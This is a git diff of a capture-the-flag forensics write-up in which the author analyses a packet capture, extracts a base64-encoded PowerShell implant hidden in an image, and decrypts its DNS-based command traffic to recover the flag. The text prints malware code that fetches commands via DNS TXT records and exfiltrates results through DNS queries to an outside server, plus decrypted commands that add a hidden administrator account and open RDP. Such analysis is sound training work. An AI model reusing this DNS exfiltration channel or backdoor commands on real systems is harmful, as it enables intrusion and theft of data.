@@ -5,12 +5,13 @@ Looked at the pcap for a bit in wireshark.  Analyzed convo's, looked for many re
 Also took apart the pcap in an online analyzer after this; https://apackets.com/pcaps/flows  - This was pretty cool.
 
 Happened to notice some requests to ‘windowsupdatelive.com’ which looks super funky..
-10.0.2.15:49804   WINDoWslIVeupDATeR.cOM (77.74.198.52):80 (GET)
+`10.0.2.15:49804   WINDoWslIVeupDATeR.cOM (77.74.198.52):80 (GET)`
 
 Found an image file in one of them, took it and saved to file it was white 64x64px or whatnot, but looked at it in a hex editor and its base64.  
 
-Decoded base64 and:
-`
+Decoded base64 and got this:
+
+```
 function Create-AesManagedObject($key, $IV) {
     $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
     $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
@@ -20,12 +21,9 @@ function Create-AesManagedObject($key, $IV) {
     if ($IV) {
         if ($IV.getType().Name -eq "String") {
             $aesManaged.IV = [System.Convert]::FromBase64String($IV)
-     
         }
         else {
             $aesManaged.IV = $IV
-     
-
         }
     }
     if ($key) {
@@ -41,8 +39,7 @@ function Create-AesManagedObject($key, $IV) {
 }
 
 function Create-AesKey() {
-  
-    $aesManaged = Create-AesManagedObject $key $IV
+   $aesManaged = Create-AesManagedObject $key $IV
     [System.Convert]::ToBase64String($aesManaged.Key)
 }
 
@@ -79,26 +76,26 @@ $domain = -join($pr[$ans],".windowsliveupdater.com")
 Resolve-DnsName -type A -DnsOnly $domain -Server 147.182.172.189
     }
 Resolve-DnsName -type A -DnsOnly end.windowsliveupdater.com -Server 147.182.172.189
-}
-`
+}```
+
 
 Looked up the key:
-`
-echo a1E4MUtycWswTmtrMHdqdg== | base64 -d
-kQ81Krqk0Nkk0wjv
-`
+
+```echo a1E4MUtycWswTmtrMHdqdg== | base64 -d
+kQ81Krqk0Nkk0wjv```
+
 This doesn't mean much but maybe it can be used to decode some of the traffic!
 
 Analyzed the rest of the traffic from 77.74.198.52
 
 Ref'd back to the pcap it sent only this image back.
 
-this was at 1931 - 19.145926
+This was at packet 1931 - 19.145926
 
-found another request after with a UDP stream on port 53 (dns response is how the data is infiltrated!!)
-`
- {...........windowsliveupdater.com..... {...........windowsliveupdater.com..............,.-,Ifu1yiK5RMABD4wno66axIGZuj1HXezG5gxzpdLO6ws=.........,.-,hhpgWsOli4AnW9g/7TM4rcYyvDNky4yZvLVJ0olX5oA=.........,.-,58v04KhrSziOyRaMLvKM+JrCHpM4WmvBT/wYTRKDw2s=.........,...eTtfUgcchm/R27YJDP0iWnXHy02ijScdI4tUqAVPKGf3nsBE28fDUbq0C8CnUnJC57lxUMYFSqHpB5bhoVTYafNZ8+ijnMwAMy4hp0O4FeH0Xo69ahI8ndUfIsiD/Bru.........,...BbvWcWhRToPqTupwX6Kf7A0jrOdYWumqaMRz6uPcnvaDvRKY2+eAl0qT3Iy1kUGWGSEoRu7MjqxYmek78uvzMTaH88cWwlgUJqr1vsr1CsxCwS/KBYJXhulyBcMMYOtcqImMiU3x0RzlsFXTUf1giNF2qZUDthUN7Z8AIwvmz0a+5aUTegq/pPFsK0i7YNZsK7JEmz+wQ7Ds/UU5+SsubWYdtxn+lxw58XqHxyAYAo0=.........,...vJxlcLDI/0sPurvacG0iFbstwyxtk/el9czGxTAjYBmUZEcD63bco9uzSHDoTvP1ZU9ae5VW7Jnv9jsZHLsOs8dvxsIMVMzj1ItGo3dT+QrpsB4M9wW5clUuDeF/C3lwCRmYYFSLN/cUNOH5++YnX66b1iHUJTBCqLxiEfThk5A=.........,.A@M3/+2RJ/qY4O+nclGPEvJMIJI4U6SF6VL8ANpz9Y6mSHwuUyg4iBrMrtSsfpA2bh
-`
+Found another request after with a UDP stream on port 53 (dns response is how the data is infiltrated!!)
+
+```{...........windowsliveupdater.com..... {...........windowsliveupdater.com..............,.-,Ifu1yiK5RMABD4wno66axIGZuj1HXezG5gxzpdLO6ws=.........,.-,hhpgWsOli4AnW9g/7TM4rcYyvDNky4yZvLVJ0olX5oA=.........,.-,58v04KhrSziOyRaMLvKM+JrCHpM4WmvBT/wYTRKDw2s=.........,...eTtfUgcchm/R27YJDP0iWnXHy02ijScdI4tUqAVPKGf3nsBE28fDUbq0C8CnUnJC57lxUMYFSqHpB5bhoVTYafNZ8+ijnMwAMy4hp0O4FeH0Xo69ahI8ndUfIsiD/Bru.........,...BbvWcWhRToPqTupwX6Kf7A0jrOdYWumqaMRz6uPcnvaDvRKY2+eAl0qT3Iy1kUGWGSEoRu7MjqxYmek78uvzMTaH88cWwlgUJqr1vsr1CsxCwS/KBYJXhulyBcMMYOtcqImMiU3x0RzlsFXTUf1giNF2qZUDthUN7Z8AIwvmz0a+5aUTegq/pPFsK0i7YNZsK7JEmz+wQ7Ds/UU5+SsubWYdtxn+lxw58XqHxyAYAo0=.........,...vJxlcLDI/0sPurvacG0iFbstwyxtk/el9czGxTAjYBmUZEcD63bco9uzSHDoTvP1ZU9ae5VW7Jnv9jsZHLsOs8dvxsIMVMzj1ItGo3dT+QrpsB4M9wW5clUuDeF/C3lwCRmYYFSLN/cUNOH5++YnX66b1iHUJTBCqLxiEfThk5A=.........,.A@M3/+2RJ/qY4O+nclGPEvJMIJI4U6SF6VL8ANpz9Y6mSHwuUyg4iBrMrtSsfpA2bh```
+
 Took and tried to base64 -d these;
 Played around a bit and got nowhere,  figured out to try to use the ps1 file above to decrypt..
 However, they are not decrypting after putting them in this format. Can't figure this out so far. Moving on...
@@ -106,8 +103,8 @@ However, they are not decrypting after putting them in this format. Can't figure
 
 Found that a bunch of DNS queries were going out:
 
-`
-windowsliveupdater.com
+
+```windowsliveupdater.com
 start.windowsliveupdater.com
 CC1C9AC2958A2E63609272E2B4F8F436.windowsliveupdater.com
 32A806549B03AB7E4EB39771AEDA4A1B.windowsliveupdater.com
@@ -168,11 +165,11 @@ ABCE30583F503B484BF99020E28A1B8F.windowsliveupdater.com
 7E2854D11003AB6E2F4BFB4F7E2477DA.windowsliveupdater.com
 A44FCA3BC6021777F03F139D458C0524.windowsliveupdater.com
 AE4ABE8A3A88D21DEEA071A72D65A35E.windowsliveupdater.com
-F158D9F025897D1843E37B7463EC7833.windowsliveupdater.com
-`
+F158D9F025897D1843E37B7463EC7833.windowsliveupdater.com```
+
 Converted these to codes I can try to reverse..
 
-`cat reqs.txt | tr -s '.' ' ' | awk '{print $1}' > reqs2.txt`
+```cat reqs.txt | tr -s '.' ' ' | awk '{print $1}' > reqs2.txt```
 
 Soo.. Walked through EXACTLY whats happening here with the first request to Windowsliveupdater.com on port 80
 returns /desktop.png
@@ -181,21 +178,21 @@ Lets break it down:
 
 So there is a filter which just breaks the ‘query’ down to parts and doesn't stop the pipeline, just keeps outputting each part of the query:
 
-`filter parts($query) { $t = $_; 0..[math]::floor($t.length / $query) | % { $t.substring($query * $_, [math]::min($query, $t.length - $query * $_)) }} 
-$key = "a1E4MUtycWswTmtrMHdqdg=="`
+```filter parts($query) { $t = $_; 0..[math]::floor($t.length / $query) | % { $t.substring($query * $_, [math]::min($query, $t.length - $query * $_)) }} 
+$key = "a1E4MUtycWswTmtrMHdqdg=="```
 
 The first thing the script actually does, is reach out to 147.182.172.189 and do a dnsquery for windowsliveupdater.com and return the Strings as $out:
-`$out = Resolve-DnsName -type TXT -DnsOnly windowsliveupdater.com -Server 147.182.172.189|Select-Object -Property Strings;`
+```$out = Resolve-DnsName -type TXT -DnsOnly windowsliveupdater.com -Server 147.182.172.189|Select-Object -Property Strings;```
 
 Looked at what this did on a another domain like windows.com, to get a look at how it might output:
 PS C:\Users\cryptic.XDDEV> Resolve-DnsName -type TXT -DnsOnly windows.com | select-object -property Strings
-`
+```
 Strings
 -------
 {v=spf1 mx -all}
 {facebook-domain-verification=d65hkhpulntsek90x3rt1cqq4y06tk}
 {D-TRUST=27XN9J9VBV6S24F}
-`
+```
 This should show a bunch of txt records. 
 Then, for each TXT record string, returned from the dns query (except for the last 2 lines?  Looks like these are blank automatically on the output):
 `for ($num = 0 ; $num -le $out.Length-2; $num++){`
@@ -228,7 +225,7 @@ Sends a response to end. telling it it is done.
 
 So, now I need to look for the DNS response with the TXT records returned.  This should be near the first DNS request to 147.182.172.189, after the port 80 req.  Found it:
 
-`
+```
 0000   08 00 27 d4 3a 20 52 54 00 12 35 02 08 00 45 00   ..'.: RT..5...E.
 0010   03 7b 94 ba 00 00 40 11 96 35 93 b6 ac bd 0a 00   .{....@..5......
 0020   02 0f 00 35 f7 60 03 67 36 c2 20 7b 85 80 00 01   ...5.`.g6. {....
@@ -286,7 +283,7 @@ So, now I need to look for the DNS response with the TXT records returned.  This
 0360   4a 49 34 55 36 53 46 36 56 4c 38 41 4e 70 7a 39   JI4U6SF6VL8ANpz9
 0370   59 36 6d 53 48 77 75 55 79 67 34 69 42 72 4d 72   Y6mSHwuUyg4iBrMr
 0380   74 53 73 66 70 41 32 62 68                        tSsfpA2bh
-`
+```
 Definitely tried cleaning these up and decrypting. Need to figure out why they won't decrypt. Maybe needs to be a slight diff format..
 
 Keep running into issue with the 1st bytes not being able to be read into $bytes for the IV:
@@ -308,7 +305,7 @@ At i4.ps1:48 char:5
 
 
 Output of each:
-`
+```
 1
 ¶Í¯©Pl§¢../Ã
 Ý..hostname........
@@ -322,14 +319,14 @@ Output of each:
 Äª¦3..O.ª.y.ê.net user DefaultUsr "JHBhcnQxPSdIVEJ7eTB1X2M0bl8n" /add /Y; net localgroup Administrators /add DefaultUsr; net localgroup "Remote Desktop Users" /add DefaultUsr¦óZ.5[...$.U._¥;netsh advfirewall firewall add rule name="Terminal Server" dir=in action=allow protocol=TCP localport=3389......ZuT.
 .ØÒ[Ô.ö÷õÀñnet start TermService...........
 
-$part1='HTB{y0u_c4n_'
-`
+$part1='HTB{y0u_c4n_
+```
 I bet the last part is the first stuff I decrypted from each part, decrypted again
 
 So, grabbed all of this in byte format and did this quick python to split into 16 char pieces:
 
 
-`
+```
 cat conv.py
 
 t = 'b6cdafa9506ca7a294022fc30add148b686f73746e616d6500000000000000006b391c01442c135b5875302a0295780f77686f616d6900000000000000000000e9a11450da2349238a3c887be4f35a5e6970636f6e6669670000000000000000bf6751ed8718d730f7db587d14571db4776d6963202f6e616d6573706163653a5c5c726f6f745c536563757269747943656e746572205041544820416e7469566972757350726f6475637420474554202f76616c7565000000000000000000002a0dc4aaa63315954f9faa8c7905ea166e657420757365722044656661756c7455737220224a484268636e51785053644956454a376554423158324d30626c386e22202f616464202f593b206e6574206c6f63616c67726f75702041646d696e6973747261746f7273202f6164642044656661756c745573723b206e6574206c6f63616c67726f7570202252656d6f7465204465736b746f7020557365727322202f6164642044656661756c74557372a6f35a9d355b819d0b241a55055fa53b6e65747368206164766669726577616c6c206669726577616c6c206164642072756c65206e616d653d225465726d696e616c2053657276657222206469723d696e20616374696f6e3d616c6c6f772070726f746f636f6c3d544350206c6f63616c706f72743d333338390000000000005a75540b0d14d8d25bd483f6f7f5c0f16e6574207374617274205465726d536572766963650000000000000000000000'
@@ -338,9 +335,9 @@ lines=[t[i:i+n] for i in range(0, len(t), n)]
 
 print(t)
 print(lines)
-`
+```
 split into lines with 2 parts so I can awk it:
-`
+```
 ['b6cdafa9506ca7a294022fc30add148b', '686f73746e616d650000000000000000', 
 '6b391c01442c135b5875302a0295780f', '77686f616d6900000000000000000000', 
 'e9a11450da2349238a3c887be4f35a5e', '6970636f6e6669670000000000000000', 
@@ -360,7 +357,7 @@ split into lines with 2 parts so I can awk it:
 '6e6574207374617274205465726d5365', '72766963650000000000000000000000']
 
 525400123502080027d43a2008004500006575650000801100000a00020f93b6acbdd2fc003500514ce568bb010000010000000000002043433143394143323935384132453633363039323732453242344638463433361277696e646f77736c6976657570646174657203636f6d0000010001
-`
+```
 Nope.. Idk why I can't seem to get these to be happy with the decryption process, oh well..
 
 Couldn't get this.. Took a break from it.
@@ -375,8 +372,8 @@ okay great, taking a break really helped; played around and got this:
 
 idk how I couldn't make it work before, just messed aroudn enough and finally got it. PHEW!
 
-Decrypted all:
-`
+Decrypted all to:
+```
 CC1C9AC2958A2E63609272E2B4F8F436
 32A806549B03AB7E4EB39771AEDA4A1B
 C1006AC8A03F9776B08321BD6D5247BB
@@ -432,24 +429,23 @@ FC32DDD67F275307A74B2C4D0864B3F0
 E990A6FB6424A7501823AD31D3D6B634
 
     companyName=Panaman  displayName=Pan Antivirus 4.0, $part2=4utom4t3_but_y0u_c4nt_h1de}  instanceGuid={CD3EA3C2-91CB-4359-90DC-1E909147B6B0}  onAccessScanningEnabled=TRUE  pathToSignedProductExe=panantivir
-`
-YEA S0N.. GOT IT.. FLAG PART 2/2 W00t
+```
+YEA S0N.. GOT IT.. FLAG PART 2/2 yeaaaaaa. <#feelsgood>
 
 Couldn't use this last string!? ah well dont need it looks like..
-`
-4C7971C8D447C078C4471732AD881C39
-`
+`4C7971C8D447C078C4471732AD881C39`
 
 Put them together..
 
-`$part1='HTB{y0u_c4n_'
+```$part1='HTB{y0u_c4n_'
 $part2=4utom4t3_but_y0u_c4nt_h1de}
 
 HTB{y0u_c4n_4utom4t3_but_y0u_c4nt_h1de}
-`
+```
+
+This took WAY longer than I had expected.  Another guy I was working with found the pcap download much faster than me, and I helped him w/ the powershell a little bit.  Was a lot of fun talking shop w/ him.. sup fr0z ;>
 
 
-source possibly:
-`
-https://gist.github.com/ctigeek/2a56648b923d198a6e60
-`
+Note: Source, possibly, from 2016- looks just like it:
+`https://gist.github.com/ctigeek/2a56648b923d198a6e60`
+
